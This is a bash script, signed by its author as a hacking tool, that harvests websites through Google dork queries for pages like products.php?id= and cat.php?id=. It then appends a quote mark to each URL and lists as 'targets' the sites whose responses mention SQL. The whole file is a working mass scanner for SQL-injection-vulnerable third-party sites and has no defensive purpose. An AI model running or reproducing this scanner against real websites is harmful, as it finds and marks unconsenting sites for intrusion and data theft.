#!/bin/bash
normal='\e[0m'
blue='\e[1;94m'
red='\e[1;31m'
yellow='\e[1;33m'
ul='\e[1;4m'
purp='\e[1;35m'
green='\e[1;32m'
echo -e "${yellow}:::${blue}===$yellow  :::$blue  ===  ===$yellow :::${blue}=======${yellow}  ::: :::${blue}= ==="
echo -e "${yellow}:::     :::$blue  ===  ===$yellow :::$blue === ===$yellow ::: :::${blue}====="
echo -e " =====  ===  ===  === === === === === ========"
echo -e "    ===  ===========  ===     === === === ===="
echo -e "======    ==== ====   ===     === === ===  ==="
echo -e "|__        $red Coded by $purp @rebellion"
echo -e "${blue}|"
if [[ -d .workspace ]] ; then rm -rf .workspace ; fi
mkdir .workspace
cd .workspace
dork[0]="products.php?id=&start="
dork[1]="gallery.php?id=&start="
dork[2]="cat.php?id=&start="
dork[3]="default.php?catID=&start="
x=0 ; y=0
for i in $( seq 1 5 ) ; do
	rand=$[ $RANDOM % 4 ]
	for i in $( seq 1 7 ) ; do
        	arr[$y]="${dork[$rand]}$x"
        	let x+=10
        	let y+=1
	done
	page=$[ $RANDOM & 9 ]
	scan=`lynx -dump http://www.google.com/search?q=$( echo ${arr[$page]} )`
	if [[ $scan =~ "Our systems have detected unusual traffic from your computer network." ]] ; then
		echo -e "${purp}|`date | awk {' print $4 '}`]${yellow} GOOGLE systems have ${red}detected$yellow Your unusual traffic and$red blocked$yellow it ."
		exit 0
	else
		lynx -dump http://www.google.com/search?q=$( echo ${arr[$page]} ) | grep .com | grep -ve google -e youtube | grep -h ?id= | awk {' print $1 '} >> sites.txt
	fi
done
sort -u sites.txt | grep -h -e ^www -e ^http > sites2.txt
for i in $( cat sites2.txt ) ; do echo -e "${purp}|`date | awk {' print $4 '}`$normal SUCCESS]$green Site found: $i" ; done
fn=$( wc -l sites2.txt | awk {'print $1'} )
echo -e "${purp}|`date | awk {' print $4 '}`]${yellow} FOUND$red $fn ${yellow}POSSIBLE TARGETS"
echo -e "${purp}|`date | awk {' print $4 '}`]${yellow} START TESTING ... "
for i in $( cat sites2.txt ) ; do
	if [[ $(lynx -dump ${i}\' ) =~ "SQL" ]] ; then
                echo -e "${purp}|`date | awk {' print $4 '}`]${yellow}[+] TARGET FOUND ! (($red $i $yellow )) $normal"
		echo $i >> found.txt
	fi
done
if [[ -f found.txt ]] ; then
	echo -e "${purp}|`date | awk {' print $4 '}`]${yellow} FINISH WITH$red `wc -l found.txt | awk {' print $1 '}` $yellow TARGETS FOUND $normal"
else
	echo -e "${purp}|`date | awk {' print $4 '}`]${yellow} FINISH WITH$red 0$yellow TARGETS FOUND $normal"
fi

